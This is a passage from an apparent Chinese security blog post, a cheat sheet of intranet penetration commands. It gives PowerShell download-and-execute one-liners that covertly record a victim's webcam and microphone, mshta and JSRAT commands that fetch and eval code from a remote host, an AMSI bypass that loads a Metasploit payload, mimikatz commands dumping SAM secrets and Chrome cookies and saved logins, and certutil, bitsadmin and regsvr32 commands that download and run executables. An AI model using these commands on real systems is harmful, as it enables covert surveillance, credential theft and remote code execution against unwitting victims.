+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -nop -exec bypass -c <span style="color:#d14">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&#39;); Capture-MiniEye -RecordTime 2 -Path env:temp\hack.avi&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>录音:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -nop -exec bypass -c <span style="color:#d14">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&#39;);Get-MicrophoneAudio -Path env:TEMP\secret.wav -Length 10 -Alias &#39;SECRET&#39;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="mshta"><strong>MSHTA</strong></h3>
+<h4 id="vbscript-exec"><strong>VBSCRIPT EXEC</strong></h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mshta vbscript<span style="color:#a61717;background-color:#e3d2d2">:</span>CreateObject(<span style="color:#d14">&#34;Wscript.Shell&#34;</span>).Run(<span style="color:#d14">&#34;calc.exe&#34;</span>,0,true)(window.close)
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="javascript-exec"><strong>JAVASCRIPT EXEC</strong></h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mshta javascript<span style="color:#a61717;background-color:#e3d2d2">:</span><span style="color:#d14">&#34;..\mshtml,RunHTMLApplication &#34;</span>;document.write();h=new<span style="color:#000;font-weight:bold">%</span>20ActiveXObject(<span style="color:#d14">&#34;WScript.Shell&#34;</span>).run(<span style="color:#d14">&#34;calc.exe&#34;</span>,0,true);<span style="color:#000;font-weight:bold">try</span>{h.Send();b=h.ResponseText;eval(b);}<span style="color:#000;font-weight:bold">catch</span>(e){new<span style="color:#000;font-weight:bold">%</span>20ActiveXObject(<span style="color:#d14">&#34;WScript.Shell&#34;</span>).Run(<span style="color:#d14">&#34;cmd /c taskkill /f /im mshta.exe&#34;</span>,0,true);}
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="jsrat"><strong>JSRAT</strong></h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mshta javascript<span style="color:#a61717;background-color:#e3d2d2">:</span><span style="color:#d14">&#34;..\mshtml,RunHTMLApplication &#34;</span>;document.write();h=new<span style="color:#000;font-weight:bold">%</span>20ActiveXObject(<span style="color:#d14">&#34;WinHttp.WinHttpRequest.5.1&#34;</span>);h.Open(<span style="color:#d14">&#34;GET&#34;</span>,<span style="color:#d14">&#34;http://192.168.2.101:9998/connect&#34;</span>,false);<span style="color:#000;font-weight:bold">try</span>{h.Send();b=h.ResponseText;eval(b);}<span style="color:#000;font-weight:bold">catch</span>(e){new<span style="color:#000;font-weight:bold">%</span>20ActiveXObject(<span style="color:#d14">&#34;WScript.Shell&#34;</span>).Run(<span style="color:#d14">&#34;cmd /c taskkill /f /im mshta.exe&#34;</span>,0,true);}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="bypass-amsi"><strong>Bypass AMSI</strong></h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#0086b3">PS </span>C:&gt; <span style="color:#008080">[Ref]</span>.Assembly.GetType(<span style="color:#d14">&#39;System.Management.Automation.AmsiUtils&#39;</span>).GetField(<span style="color:#d14">&#39;amsiInitFailed&#39;</span>,<span style="color:#d14">&#39;NonPublic,Static&#39;</span>).SetValue(null,true)
+</code></pre></td></tr></table>
+</div>
+</div><p>use:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -ExecutionPolicy Bypass -noprofile <span style="color:#008080">[Ref]</span>.Assembly.GetType(<span style="color:#d14">&#39;&#39;</span>System.Management.Automation.AmsiUtils<span style="color:#d14">&#39;&#39;</span>).GetField(<span style="color:#d14">&#39;&#39;</span>amsiInitFailed<span style="color:#d14">&#39;&#39;</span>,<span style="color:#d14">&#39;&#39;</span>NonPublic,Static<span style="color:#d14">&#39;&#39;</span>).SetValue(null,true);iex(<span style="color:#0086b3">New-Object</span> Net.WebClient).DownloadString(<span style="color:#d14">&#39;&#39;</span>http<span style="color:#a61717;background-color:#e3d2d2">:</span>//192.168.230.1/msfpayload.ps1<span style="color:#d14">&#39;&#39;</span>)
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="bypass-av">Bypass AV</h3>
+<pre><code>sqlite3.exe -cmd &quot;select load_extension('1.txt','EP')&quot;
+sqlite3.exe -cmd &quot;select load_extension('\192.168.1.101\share\1.txt','EP')&quot;
+mimikatz
+</code></pre><h3 id="获取vpn密码">获取vpn密码</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">mimikatz.exe privilege<span style="color:#000;font-weight:bold">::</span>debug token<span style="color:#000;font-weight:bold">::</span>elevate lsadump<span style="color:#000;font-weight:bold">::</span>sam lsadump<span style="color:#000;font-weight:bold">::</span>secrets exit
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="读取chrome-cookies">读取chrome cookies</h3>
+<pre><code>mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit
+mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit
+mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit 
+</code></pre><h2 id="命令行下载">命令行下载</h2>
+<h3 id="certutil">certutil</h3>
+<p><code>certutil -urlcache -split -f example.com/file</code></p>
+<p><code>certutil -urlcache -split -f http://ip:8000/10000.txt d:\1234.txt&amp;&amp;d:\1234.txt</code></p>
+<p>今天偶然利用此命令干成了大事，老司机一看就懂
+命令用法百度搜到的，希望对各位表哥有用</p>
+<p><code>echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 &gt;hex.txt</code></p>
+<p>生成 hex.txt，机器码对应的内容是 Hallo World!</p>
+<p><code>certutil -decodehex hex.txt bin.txt</code>
+Hex2Bin</p>
+<p><code>certutil -encode bin.txt Encode.txt</code>
+Base64_Encode</p>
+<p><code>certutil -decode Encode.txt Decode.txt</code>
+Base64_Decode</p>
+<h3 id="powshell">powshell</h3>
+<p><code>powershell (new-object System.Net.WebClient).DownloadFile('http://ip/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'</code></p>
+<h3 id="bitsadmin">bitsadmin</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> bitsadmin /transfer n http<span style="color:#a61717;background-color:#e3d2d2">:</span>//ip<span style="color:#a61717;background-color:#e3d2d2">:</span>8000/10000.txt d:\12345.txt &amp;&amp; d:\12345.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="regsvr32">regsvr32</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">regsvr32 /u /s /i:http<span style="color:#a61717;background-color:#e3d2d2">:</span>//ip/5.exe scrobj.dll
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="curl">curl</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://ip:8000/10000.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="wget">wget</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://ip:8000/10000.txt -O 1.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="awk">awk</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">awk <span style="color:#d14">&#39;BEGIN {
+</span><span style="color:#d14">  RS = ORS = &#34;\r\n&#34;
+</span><span style="color:#d14">  HTTPCon = &#34;/inet/tcp/0/127.0.0.1/8000&#34;
+</span><span style="color:#d14">  print &#34;GET /10000.txt HTTP/1.1\r\nConnection: close\r\n&#34;    |&amp; HTTPCon
+</span><span style="color:#d14">  while (HTTPCon |&amp; getline &gt; 0)
+</span><span style="color:#d14">      print $0
+</span><span style="color:#d14">  close(HTTPCon)
+</span><span style="color:#d14">}&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://blog.taielab.com">码中春秋</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://blog.taielab.com/2018-10-19/network-infiltration-command.html">https://blog.taielab.com/2018-10-19/network-infiltration-command.html</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4'>内网渗透命令</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "udpsec/blog-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://blog.taielab.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://blog.taielab.com">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-11-25/ios-13-checkra-in-repair-the-internet-connection-appears-to-be-offline.html" title="IOS 13.2.2 越狱 修复 The internet connection appears to be offline 错误">IOS 13.2.2 越狱 修复 The internet connection appears to be offline 错误</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-06-29/red-team-and-physical-entry-gear-tips.html" title="护网之红方物理入侵旁门左道">护网之红方物理入侵旁门左道</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-06-05/intranet-roaming-network-traffic-control.html" title="内网漫游系列之流量操控与Socks代理总结">内网漫游系列之流量操控与Socks代理总结</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-27/intranet-roaming-ss-privoxy.html" title="内网漫游系列之正向全局代理ss&#43;Privoxy">内网漫游系列之正向全局代理ss&#43;Privoxy</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-20/centos-7-upgrade-Kernel.html" title="Centos7安装升级最新内核">Centos7安装升级最新内核</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/digital-forensics-live-and-dead.html" title="数字取证-死活取证">数字取证-死活取证</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/centos-7-deploy-local-yum-repository.html" title="Centos7搭建本地yum仓库">Centos7搭建本地yum仓库</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/osint-101-auto-visual.html" title="OSINT101 技术自动化和可视化">OSINT101 技术自动化和可视化</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-04-21/ubuntu-migrate-to-ssd.html" title="Ubuntu19.04迁移到SSD">Ubuntu19.04迁移到SSD</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-04-16/kali-linux-double-display-solutions.html" title="双显卡电脑安装Kali进系统黑屏和安装双显卡解决方案">双显卡电脑安装Kali进系统黑屏和安装双显卡解决方案</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title" style="color:red">福利派送</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+<ul class="widget-list">
+    
+    <li><a href="https://blog.taielab.com/categories/IOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/">IOS应用逆向与安全 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/Linux/">Linux (11)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透 (3)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建 (3)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%B7%A5%E5%85%B7%E6%95%88%E7%8E%87/">工具效率 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/">开源情报收集 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8/">数字安全 (30)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库 (2)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派 (2)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全 (6)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/">网络运维 (3)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title">标签</h3>
+<div class="tagcloud">
+    
+    <a href="https://blog.taielab.com/tags/Debian/">Debian</a>
+    
+    <a href="https://blog.taielab.com/tags/IOS/">IOS</a>
+    
+    <a href="https://blog.taielab.com/tags/OSINT/">OSINT</a>
+    
+    <a href="https://blog.taielab.com/tags/archlinux/">archlinux</a>
+    
+    <a href="https://blog.taielab.com/tags/centos/">centos</a>
+    
+    <a href="https://blog.taielab.com/tags/github/">github</a>
+    
+    <a href="https://blog.taielab.com/tags/gitup/">gitup</a>
+    
+    <a href="https://blog.taielab.com/tags/gpg/">gpg</a>
+    
+    <a href="https://blog.taielab.com/tags/hexo/">hexo</a>
+    
+    <a href="https://blog.taielab.com/tags/hugo/">hugo</a>
+    
+    <a href="https://blog.taielab.com/tags/kali-linux/">kali-linux</a>
+    
+    <a href="https://blog.taielab.com/tags/lnmp/">lnmp</a>
+    
+    <a href="https://blog.taielab.com/tags/manjaro/">manjaro</a>
+    
+    <a href="https://blog.taielab.com/tags/meedu/">meedu</a>
+    
+    <a href="https://blog.taielab.com/tags/nessus/">nessus</a>
+    
+    <a href="https://blog.taielab.com/tags/parrot-os/">parrot-os</a>
+    
+    <a href="https://blog.taielab.com/tags/pentestbox/">pentestbox</a>
+    
+    <a href="https://blog.taielab.com/tags/shadowsocks/">shadowsocks</a>
+    
+    <a href="https://blog.taielab.com/tags/tor/">tor</a>
+    
+    <a href="https://blog.taielab.com/tags/ubuntu/">ubuntu</a>
+    
+    <a href="https://blog.taielab.com/tags/vps/">vps</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/">内网渗透命令</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/">内网漫游</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">奇淫技巧</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/">数字安全基础篇</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">数字安全工具篇</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">数据分析</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/">数据库系统原理</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%AD%BB%E6%B4%BB%E5%8F%96%E8%AF%81/">死活取证</a>
+    
+    <a href="https://blog.taielab.com/tags/%E7%89%A9%E7%90%86%E5%85%A5%E4%BE%B5/">物理入侵</a>
+    
+    <a href="https://blog.taielab.com/tags/%E8%B8%8F%E9%9B%AA%E6%97%A0%E7%97%95%E7%B3%BB%E5%88%97/">踏雪无痕系列</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a target="_blank" href="#" title=""></a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://blog.taielab.com/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+    <footer id="footer">
+    <div class="container">
+        &copy; 2020 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
+        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/flysnow-org/maupassant-hugo" target="_blank">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'GA ID', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/js/douban.js'></script>
+
+</body>
+
+</html>
